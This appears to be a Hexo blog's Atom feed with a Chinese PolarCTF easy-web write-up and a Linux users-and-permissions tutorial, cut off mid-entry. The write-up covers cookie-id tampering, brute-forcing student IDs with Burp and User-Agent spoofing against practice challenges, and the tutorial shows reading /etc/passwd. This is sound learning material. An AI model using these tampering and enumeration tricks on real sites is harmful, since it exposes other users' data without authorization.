<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>运启霖泽</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-10-24T12:21:14.972Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>It is mine</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>polarCTF简单web1</title>
    <link href="http://example.com/2025/10/24/polarCTF%E7%AE%80%E5%8D%95web1/"/>
    <id>http://example.com/2025/10/24/polarCTF%E7%AE%80%E5%8D%95web1/</id>
    <published>2025-10-24T12:20:54.000Z</published>
    <updated>2025-10-24T12:21:14.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="polar-CTF-简单web"><a href="#polar-CTF-简单web" class="headerlink" title="polar CTF 简单web"></a>polar CTF 简单web</h1><h2 id="召唤神龙"><a href="#召唤神龙" class="headerlink" title="召唤神龙"></a>召唤神龙</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922195810955.png" alt="image-20250922195810955"></p><p>在main.js里面发现了JSfuck解密</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922202048167.png" alt="image-20250922202048167"></p><h3 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h3><p><strong>JSFuck</strong> 是用仅由 <code>[]()+!</code> 等少数字符构成的 JavaScript 代码，来表示任意字符&#x2F;任意 JS 程序的<strong>极端混淆&#x2F;编码</strong>方式。</p><p>它的输出仍然是合法的 JavaScript：<code>eval</code> 这些代码后会得到原始字符串或执行原始代码（取决于编码方式）。</p><p>因为最终是可执行代码，<strong>直接 eval 未经信任的 JSFuck 代码存在风险</strong>（可能包含后门、挖矿、删除文件等）。</p><h2 id="seek-flag"><a href="#seek-flag" class="headerlink" title="seek flag"></a>seek flag</h2><p>查看网页源代码</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922202712569.png" alt="image-20250922202712569"></p><p>注释说爬虫，直接查一下</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922202755580.png" alt="image-20250922202755580"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3:c0ad71dadd11&#125;</span><br></pre></td></tr></table></figure><p>只有一半，抓包</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922204139019.png" alt="image-20250922204139019"></p><p>抓包后发现Cookie有个id改一下试试</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922204207059.png" alt="image-20250922204207059"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag1:flag&#123;7ac5b</span><br><span class="line">Flag2: 3ca8737a70f029d</span><br><span class="line">拼接一下：</span><br><span class="line">flag&#123;7ac5b3ca8737a70f029dc0ad71dadd11&#125;</span><br></pre></td></tr></table></figure><h3 id="爬虫时的robots-txt"><a href="#爬虫时的robots-txt" class="headerlink" title="爬虫时的robots.txt"></a>爬虫时的robots.txt</h3><p>爬虫（Web Crawler）和 <code>robots.txt</code> 的关系，本质上是 <strong>“网站管理员给爬虫的行为指引”</strong>。</p><h4 id="什么是-robots-txt"><a href="#什么是-robots-txt" class="headerlink" title="什么是 robots.txt"></a>什么是 <code>robots.txt</code></h4><ul><li><code>robots.txt</code> 文件是放在网站根目录下（例如 <code>https://example.com/robots.txt</code>）的一个<strong>文本协议文件</strong>，属于 <strong>Robots Exclusion Protocol</strong>（机器人排除协议）。</li><li>它告诉搜索引擎等爬虫：<strong>哪些页面可以爬、哪些页面不允许爬</strong>。</li></ul><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Allow: /public/</span><br></pre></td></tr></table></figure><p>含义：</p><ul><li><code>User-agent: *</code> 表示对所有爬虫生效。</li><li><code>Disallow: /admin/</code> 表示禁止爬取 <code>/admin/</code> 路径下的内容。</li><li><code>Allow: /public/</code> 表示允许爬取 <code>/public/</code>。</li></ul><p>在 <code>robots.txt</code> 文件中，有时候会包含指向网站 <code>sitemap.xml</code> 文件的信息，以便搜索引擎更有效地发现网站的内容结构。</p><p><code>sitemap.xml</code>等 进一步了解：</p><p><a href="https://blog.csdn.net/abu935009066/article/details/135267626">爬虫在爬取时注意 robots.txt 和 sitemap.xml</a></p><h4 id="爬虫和此文件的关系"><a href="#爬虫和此文件的关系" class="headerlink" title="爬虫和此文件的关系"></a>爬虫和此文件的关系</h4><ul><li><strong>合规爬虫（如 Googlebot、Bingbot）</strong>：在访问网站时会先读取 <code>robots.txt</code>，按照规则来决定是否抓取。</li><li><strong>自定义爬虫（你写的爬虫脚本）</strong>：技术上 <strong>不受限制</strong>，即使 <code>robots.txt</code> 禁止了，你仍然能抓取。但这样做可能 <strong>违反网站的使用条款</strong>，甚至涉及 <strong>法律&#x2F;道德风险</strong>。</li></ul><p>换句话说：</p><ul><li><code>robots.txt</code> 并不是强制性技术屏障（不像权限认证那样），而是<strong>约定俗成的“君子协议”</strong>。</li><li>遵守与否取决于爬虫的编写者。</li></ul><h4 id="有-robots-txt原因"><a href="#有-robots-txt原因" class="headerlink" title="有 robots.txt原因"></a>有 <code>robots.txt</code>原因</h4><p><strong>保护服务器资源</strong>：防止无意义的页面被频繁抓取。</p><p><strong>隐藏敏感页面</strong>（不过真正敏感的信息不应依赖 <code>robots.txt</code>，因为别人仍然能无视规则去爬）。</p><p><strong>SEO 优化</strong>：帮助搜索引擎集中收录对网站更有价值的页面。</p><h4 id="实际开发中的处理"><a href="#实际开发中的处理" class="headerlink" title="实际开发中的处理"></a>实际开发中的处理</h4><ul><li>写爬虫时，如果是用于 <strong>学习&#x2F;个人研究</strong>，可以先去请求 <code>robots.txt</code> 文件，看看站点的规则，再决定是否遵守。</li><li>如果是要做 <strong>搜索引擎、商业爬虫</strong>，必须严格遵守，否则可能被封禁，甚至涉及法律风险。</li></ul><p>在 Python 的 <code>requests</code> + <code>BeautifulSoup</code> 爬虫里，可以用 <code>urllib.robotparser</code> 来自动解析 <code>robots.txt</code>，示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.robotparser</span><br><span class="line"></span><br><span class="line">rp = urllib.robotparser.RobotFileParser()</span><br><span class="line">rp.set_url(<span class="string">&quot;https://example.com/robots.txt&quot;</span>)</span><br><span class="line">rp.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rp.can_fetch(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;https://example.com/admin/&quot;</span>))   <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(rp.can_fetch(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;https://example.com/public/&quot;</span>))  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="cookie中的id"><a href="#cookie中的id" class="headerlink" title="cookie中的id"></a>cookie中的id</h3><p><strong>Cookie</strong> 是浏览器存储在本地、随请求发送给服务器的一段数据。</p><p>典型用途：记录用户登录状态，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: id=1001</span><br></pre></td></tr></table></figure><p>服务器收到后就知道是用户 ID&#x3D;1001 的用户。</p><p>改变id意味这成为不一样的用户，可能会得到不一样的结果。</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>查看网页源代码</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922210359106.png" alt="image-20250922210359106"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922210439578.png" alt="image-20250922210439578"></p><p>尝试改个数</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922210548427.png" alt="image-20250922210548427"></p><p>将学号位置最后一个数改成2回显了f继续更改，挨个查看</p><p>逐个尝试02到11挨个回显一个字母，拼接起来就是flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dlcg&#125;</span><br><span class="line"></span><br><span class="line">20200103</span><br><span class="line">20200104</span><br><span class="line">20200105</span><br><span class="line">20200106</span><br><span class="line">20200107</span><br><span class="line">20200108</span><br><span class="line">20200109</span><br><span class="line">20200110</span><br><span class="line">20200111</span><br><span class="line">20200112</span><br><span class="line">20200113</span><br></pre></td></tr></table></figure><p>也可以直接用burp进行攻击</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922211620517.png" alt="image-20250922211620517"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250922211655158.png" alt="image-20250922211655158"></p><p>然后还是拼接。</p><h2 id="iphone"><a href="#iphone" class="headerlink" title="iphone"></a>iphone</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250924213054448.png" alt="image-20250924213054448"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250924213112059.png" alt="image-20250924213112059"></p><p>抓包；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250924213143791.png" alt="image-20250924213143791"></p><p>将User-Agent改为iPhone；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250924213240973.png" alt="image-20250924213240973"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;polar-CTF-简单web&quot;&gt;&lt;a href=&quot;#polar-CTF-简单web&quot; class=&quot;headerlink&quot; title=&quot;polar CTF 简单web&quot;&gt;&lt;/a&gt;polar CTF 简单web&lt;/h1&gt;&lt;h2 id=&quot;召唤神龙&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux用户权限、目录及路径</title>
    <link href="http://example.com/2025/09/09/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%9B%AE%E5%BD%95%E5%8F%8A%E8%B7%AF%E5%BE%84/"/>
    <id>http://example.com/2025/09/09/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%9B%AE%E5%BD%95%E5%8F%8A%E8%B7%AF%E5%BE%84/</id>
    <published>2025-09-09T08:44:31.000Z</published>
    <updated>2025-09-09T08:45:13.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux用户、文件权限、目录、路径"><a href="#Linux用户、文件权限、目录、路径" class="headerlink" title="Linux用户、文件权限、目录、路径"></a>Linux用户、文件权限、目录、路径</h1><p>内容主要出处：</p><p><a href="https://blog.csdn.net/hzf0701/article/details/124942073">Linux用户和用户组教程</a></p><p><a href="https://docs.geeksman.com/tools/ubuntu/07.ubuntu-user-management.html">用户和用户组管理</a></p><p><a href="https://blog.csdn.net/weixin_45954730/article/details/130798013">Linux文件权限管理</a></p><p><a href="https://blog.csdn.net/u013197629/article/details/73608613">Linux权限详解（chmod、600、644、700、711、755、777、4755、6755、7755）</a></p><p><a href="https://www.cnblogs.com/sparkdev/p/9651622.html">Linux特殊权限 SUID，SGID，SBIT</a></p><p><a href="https://docs.geeksman.com/tools/ubuntu/03.ubuntu-directory-structure.html#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">Linux 目录结构</a></p><p><a href="https://blog.csdn.net/qq_36078699/article/details/141093213">一张图带你了解Linux 文件目录结构，很详细</a></p><p><a href="https://blog.csdn.net/qq_66726657/article/details/133587640">Linux中的相对路径和绝对路径</a></p><p><a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用</a></p><p><a href="https://blog.csdn.net/weixin_51697044/article/details/124271080">web项目中的相对路径和绝对路径</a></p><h2 id="用户和用户组"><a href="#用户和用户组" class="headerlink" title="用户和用户组"></a>用户和用户组</h2><h3 id="理解用户组与用户概念"><a href="#理解用户组与用户概念" class="headerlink" title="理解用户组与用户概念"></a>理解用户组与用户概念</h3><p>在建立用户组和用户之前，需要清楚用户组是由拥有相似权限需求的用户组成的。在Linux系统中，每个文件和目录都有各自的权限配置wps for linux，而用户组的存在使得权限管理变得便捷。用户则是系统中的实际使用者。以公司的Linux服务器为例，研发部门的员工可以组成一个用户组，他们对某个项目的代码目录拥有特定的读写权限。每个研发人员作为独立的用户，共享用户组的权限，同时拥有自己的账号以便于区分操作。通过将人员按角色分配到不同的用户组和用户中，可以使得系统管理更加清晰和有序。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/2144544-20201012203745705-413629468.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/7732bb2efa1f49edaa6315afb3e016f3~tplv-k3u1fbpfcp-zoom-in-crop-mark%3A1512%3A0%3A0%3A0.awebp" alt="image.png"></p><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>每个用户账号都拥有一个用户名和各自的口令（即密码）。在登录系统时，只有正确输入用户名和密码，才能进入系统和自己的主目录。</p><p>在Linux中，用户分为两大类、三小类：分别为<strong>系统管理员</strong>（一般为root）和<strong>普通用户</strong> 。普通用户中，又划分为两类，分别为系统用户和登录用户。</p><p><strong>系统管理员：</strong>即超级管理员，可以操作系统中任意文件和命令，拥有最高的管理权限。<br><strong>普通用户</strong><br>登录用户：为管理员手动添加的用户，默认仅拥有操作自身家目录中文件及目录的权限，以及进入与浏览相关目录文件的权限（如&#x2F;etc、&#x2F;var&#x2F;log等），但没有创建、修改、删除等权限。</p><p>系统用户：一般为系统安装后默认存在的，且默认情况下不能登录系统，它们的存在主要是为了满足系统进程对文件属主的需求。<br>Tips：在部署某些服务是，也可以手动添加某些系统用户。</p><p>Linux系统使用UID（User ID）来标识不同用户。Linux 系统将所有用户的名称与 ID 的对应关系都存储在 &#x2F;etc&#x2F;passwd 文件中。（其实用户名并无实际作用，只是方便用户记忆而已）</p><h4 id="超级用户（root）"><a href="#超级用户（root）" class="headerlink" title="超级用户（root）"></a>超级用户（root）</h4><ul><li><strong>用户名</strong>：<code>root</code>，<strong>UID</strong>：0</li><li><strong>权限</strong>：拥有系统的完全控制权限，能够执行所有操作（包括修改系统配置、安装&#x2F;卸载软件、管理用户、访问任意文件等）</li><li><strong>登录方式</strong>：可以通过控制台或 <code>sudo</code> 提权执行命令</li><li></li></ul><h4 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h4><p>(Regular Users）</p><ul><li><strong>UID</strong>：从 <strong>1000</strong> 开始（CentOS 7 默认）</li><li><strong>创建方式</strong>：使用 <code>useradd</code> 或图形界面添加</li><li><strong>用途</strong>：供实际使用者登录和日常操作（如开发者、系统用户）</li><li><strong>权限</strong>：只能访问授权文件和目录。无法访问系统关键目录（如 <code>/etc</code>, <code>/root</code>, <code>/boot</code> 等）</li><li><strong>提权方式</strong>：通过 <code>sudo</code>（需配置）获取临时管理员权限</li></ul><h4 id="系统用户"><a href="#系统用户" class="headerlink" title="系统用户"></a>系统用户</h4><p>（System Users）</p><ul><li><strong>UID</strong>：1 到 999（CentOS 7 默认）</li><li><strong>特点</strong>：<ul><li>通常没有登录权限（shell 是 <code>/sbin/nologin</code> 或 <code>/bin/false</code>）</li><li>不用于交互式登录，而是为某些系统服务（daemon）而存在</li></ul></li><li><strong>例子</strong>：<ul><li><code>bin</code>、<code>daemon</code>、<code>sshd</code>、<code>mysql</code>、<code>apache</code>、<code>postfix</code> 等</li></ul></li><li><strong>用途</strong>：<ul><li>运行特定服务，隔离权限</li><li>保证服务之间不会互相影响，提高安全性</li></ul></li></ul><table><thead><tr><th>UID范围</th><th>用户身份</th></tr></thead><tbody><tr><td>0</td><td>超级用户。UID 为 0 就代表这个账号是管理员账号。在 Linux 中，如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。</td></tr><tr><td>1～499</td><td>系统用户（伪用户）。也就是说，此范围的 UID 保留给系统使用。其中，1<del>99 用于系统自行创建的账号；100</del>499 分配给有系统账号需求的用户。  其实，除了 0 之外，其他的 UID 并无不同，这里只是默认 500 以下的数字给系统作为保留账户，只是一个公认的习惯而已。</td></tr><tr><td>500～65535</td><td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系，2.6.x 内核之后的 Linux 系统已经可以支持 232 个 UID 了。</td></tr></tbody></table><p> 显示 <code>/etc/login.defs</code> 文件中所有包含“UID”的配置行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/login.defs | grep UID</span><br></pre></td></tr></table></figure><p><strong><code>cat /etc/login.defs</code></strong><br> 读取并显示文件 <code>/etc/login.defs</code> 的全部内容。<br> <code>/etc/login.defs</code> 是 Linux 系统中与用户账号和密码相关的配置文件，定义了很多关于用户管理的默认参数，比如 UID 范围、密码有效期等。</p><p><code>|</code>（管道符）<br> 将前面命令的输出作为后面命令的输入。</p><p><strong><code>grep UID</code></strong><br> 在输入的文本中搜索包含字符串 <code>UID</code> 的行，并打印出来。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>是具有相同特征用户的逻辑集合。用户组里面的所有用户所拥有的权限都是一样的。所以如果想让很多用户拥有同一权限，那么就创建一个组，把需要拥有权限的用户放进这个组里就可以了。</p><p>在 Linux 系统中，用户组的划分可以从不同角度进行分类，主要包括以下三种方式：</p><p>✅ 第一种组类别（按权限角色划分）</p><ul><li><strong>管理员组</strong>：通常指具有系统管理权限的用户所属的组，例如 <code>wheel</code> 组（具备 <code>sudo</code> 权限）。</li><li><strong>普通用户组</strong>：包括系统服务用的用户组和日常登录用户所属的用户组。<ul><li><strong>系统用户组</strong>：如 <code>sshd</code>、<code>mysql</code>，主要服务于后台系统进程。</li><li><strong>登录用户组</strong>：如开发人员、学生等日常使用者所属的组。</li></ul></li></ul><p>✅ 第二种组类别（按用户归属关系划分）</p><ul><li><strong>主组（基本组）</strong>：<ul><li>每个用户<strong>必须有且只能有一个主组</strong>。</li><li>用户创建文件时，文件的默认所属组就是该用户的主组。</li></ul></li><li><strong>附加组（附属组）</strong>：<ul><li>用户可以拥有 0 个、1 个或多个附加组。</li><li>附加组常用于授予用户额外的访问权限，如加入 <code>docker</code> 组以使用容器功能。</li></ul></li></ul><p>✅ 第三种组类别（按组成员结构划分）</p><ul><li><strong>私有组</strong>：<ul><li>是系统为每个新建用户<strong>自动创建的与用户名同名的组</strong>。</li><li>该组中通常<strong>只包含该用户本身</strong>。</li><li>这是 Linux 的默认策略，称为 User Private Group（UPG）模式。</li></ul></li><li><strong>公共组</strong>：<ul><li>组内可以包含<strong>多个用户</strong>，常用于团队协作、权限共享等场景。</li><li>例如一个 <code>dev</code> 组可以包含所有开发人员，实现项目文件共享权限。</li></ul></li></ul><h3 id="用户与组的关系"><a href="#用户与组的关系" class="headerlink" title="用户与组的关系"></a>用户与组的关系</h3><ol><li>一对一：一个用户只在一个组里面，是这个组里面的唯一用户。</li><li>一对多：一个用户存在于多个用户组里面，这个用户拥有这些组的所有权限。</li><li>多对一：多个用户存在于一个组中，这些用户的权限和组都是一样的。</li><li>多对多：多个用户存在于多个组里面，这个是前面三个关系的交叉关系。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/2144544-20201012203745705-413629468.png"></p><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id username  //id 命令可以查询用户的UID、GID 和附加组的信息</span><br><span class="line">su root   # 切换管理员用户</span><br><span class="line">su 用户名  # 切换普通用户</span><br><span class="line">exit  #返回原来用户</span><br><span class="line"></span><br><span class="line">id -u [用户名]  # 查看指定用户的UID</span><br><span class="line">id -u           # 查看当前用户的UID</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715154943350.png" alt="image-20250715154943350"></p><table><thead><tr><th align="left">字段</th><th align="left">含义</th><th align="left">示例值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong><code>uid</code></strong></td><td align="left">用户ID (User ID)</td><td align="left"><code>1000(liujie)</code></td><td align="left">用户 <code>liujie</code> 的唯一数字标识，<code>1000</code> 是默认的普通用户起始UID。</td></tr><tr><td align="left"><strong><code>gid</code></strong></td><td align="left">主组ID (Group ID)</td><td align="left"><code>1000(liujie)</code></td><td align="left">用户的主组ID，通常与用户名同名（私有组）。</td></tr><tr><td align="left"><strong><code>组</code></strong></td><td align="left">附加组 (Supplementary Groups)</td><td align="left"><code>4(adm), 20(dialout), ...</code></td><td align="left">用户所属的其他组，用于扩展权限（如访问硬件、管理权限等）。</td></tr></tbody></table><p>用户属于多个附加组，赋予其额外权限：</p><table><thead><tr><th align="left">组ID</th><th align="left">组名</th><th align="left">典型权限</th></tr></thead><tbody><tr><td align="left"><code>4</code></td><td align="left"><code>adm</code></td><td align="left">可读取系统日志（如 <code>/var/log/</code>）。</td></tr><tr><td align="left"><code>20</code></td><td align="left"><code>dialout</code></td><td align="left">允许直接访问串行设备（如旧式调制解调器）。</td></tr><tr><td align="left"><code>24</code></td><td align="left"><code>cdrom</code></td><td align="left">允许操作光驱（如挂载&#x2F;弹出光盘）。</td></tr><tr><td align="left"><code>27</code></td><td align="left"><code>sudo</code></td><td align="left"><strong>关键组</strong>：允许用户通过 <code>sudo</code> 执行管理员命令。</td></tr><tr><td align="left"><code>29</code></td><td align="left"><code>audio</code></td><td align="left">允许访问音频设备（如麦克风、扬声器）。</td></tr><tr><td align="left"><code>30</code></td><td align="left"><code>dip</code></td><td align="left">允许使用拨号网络（较少见）。</td></tr><tr><td align="left"><code>44</code></td><td align="left"><code>video</code></td><td align="left">允许访问视频设备（如摄像头）。</td></tr><tr><td align="left"><code>46</code></td><td align="left"><code>plugdev</code></td><td align="left">允许管理可热插拔设备（如USB设备）。</td></tr><tr><td align="left"><code>100</code></td><td align="left"><code>users</code></td><td align="left">普通用户的标准组。</td></tr><tr><td align="left"><code>113</code></td><td align="left"><code>wireshark</code></td><td align="left">允许使用 Wireshark 抓取网络流量（需权限）。</td></tr><tr><td align="left"><code>116</code></td><td align="left"><code>bluetooth</code></td><td align="left">允许管理蓝牙设备。</td></tr><tr><td align="left"><code>136</code></td><td align="left"><code>kaboxer</code></td><td align="left">可能与特定发行版或容器化工具相关。</td></tr></tbody></table><p><strong>添加新用户账号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd 选项 用户名</span><br><span class="line">sudo useradd -d /home/luo -m luo  #示例</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>选项:<ol><li>-c “comment” ：指定一段注释性描述。</li><li>-d 目录： 指定用户主目录，如果此目录不存在，则同时使用 -m 选项，可以创建主目录。</li><li>-g 用户组 ：指定用户所属的用户组。</li><li>-G 用户组，用户组 ：指定用户所属的附加组。</li><li>-s Shell 文件 ：指定用户的登录 Shell。</li><li>-u 用户号： 指定用户的用户号，如果同时有 -o 选项，则可以重复使用其他用户的标识号。</li><li>-e 账户的到期时间，格式为YYYY-MM-DD。</li></ol></li><li>用户名：指定新账号的登录名。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708202202282.png" alt="image-20250708202202282"></p><p><strong>userdel - 删除帐号</strong></p><p>常用的选项是 <code>-r</code>，它的作用是把用户的主目录一起删除；<code>-f</code>强制删除用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userdel 选项 用户名</span><br><span class="line">sudo userdel -r luo</span><br></pre></td></tr></table></figure><p><strong>passwd - 修改用户密码</strong></p><p>用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用，即使是指定空口令。</p><p>指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">passwd </span><br><span class="line"></span><br><span class="line"># 锁定用户密码，用户不能登陆</span><br><span class="line">passwd -l 用户名</span><br><span class="line"># 解除锁定</span><br><span class="line">passwd -u 用户名</span><br><span class="line"></span><br><span class="line"># 查看用户的密码是否被锁定</span><br><span class="line">passwd -S</span><br><span class="line">sudo chage -l liujie  #查看用户密码信息</span><br><span class="line"></span><br><span class="line"># 删除用户密码，删除后用户不能登陆系统，重新设置密码后可以登陆系统</span><br><span class="line">passed -d 用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>用户组</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">groupadd [选项] 组名</span><br><span class="line"></span><br><span class="line"># 创建组</span><br><span class="line">groupadd dev</span><br><span class="line">grep dev /etc/group  #查看组</span><br><span class="line"></span><br><span class="line"># 创建用户并添加到 dev 中，-g 表示指定用户所属的用户组</span><br><span class="line">useradd -m -g dev aaa</span><br><span class="line">sudo useradd -m -g users -G dev aaa  #dev 会作为“附加组”，就会出现在 /etc/group 中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 修改现有用户到新组</span><br><span class="line">usermod -g test aaa</span><br><span class="line"></span><br><span class="line">sudo userdel -r aaa   # 删除用户及其 home 目录</span><br><span class="line">sudo groupdel dev     # 再删除 dev 组</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="用户和用户组文件"><a href="#用户和用户组文件" class="headerlink" title="用户和用户组文件"></a>用户和用户组文件</h3><h4 id="用户账号文件-etc-passwd"><a href="#用户账号文件-etc-passwd" class="headerlink" title="用户账号文件 &#x2F;etc&#x2F;passwd"></a>用户账号文件 &#x2F;etc&#x2F;passwd</h4><p>&#x2F;etc&#x2F;passwd文件是Linux系统安全的关键文件之一，只有系统管理员才可以修改此文件。该文件用于用户登录等操作时校验用户的登录名、加密的口令数据项、用户ID（UID）、默认的用户组ID（GID）、用户信息、用户主目录及登录后使用的shell。该文件种每一行保存一个用户的资料，而用户数据按域以冒号’:’分割</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#cat /etc/passwd</span><br><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708194522039.png" alt="image-20250708194522039"></p><p><a href="https://blog.csdn.net/yangchuang111213/article/details/144179418">出处</a></p><p>1）”用户名”是代表用户账号的字符串。</p><p>2）“口令”一些系统中，存放着加密后的用户口令字。</p><p>3）“用户标识号”是一个整数，系统内部用它来标识用户。</p><p>4）“组标识号”字段记录的是用户所属的用户组。</p><p>5)“注释性描述”字段记录着用户的一些个人情况。</p><p>6)“主目录”，也就是用户的起始工作目录。</p><p>7)用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。</p><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p>在 Linux 系统里，我们可以输入<code>ll</code>命令，可以看到文件的权限。</p><h3 id="权限的属组"><a href="#权限的属组" class="headerlink" title="权限的属组"></a>权限的属组</h3><p>在Linux操作系统中，任何文件都归属于某一特定的用户，其作为多用户系统，为区分不同用户对文件的权限，Linux 以 “用户与用户组” 的概念，建立用户与文件权限之间的联系，保证系统能够充分考虑每个用户的隐私保护，很大程度上保障了 Linux 作为多用户系统的可行性。从文件权限的角度出发，“用户与用户组” 引申为三个具体的对象——文件所有者、用户组成员、其他人。每一个对象对某一个文件的持有权限是不同的。</p><p><img 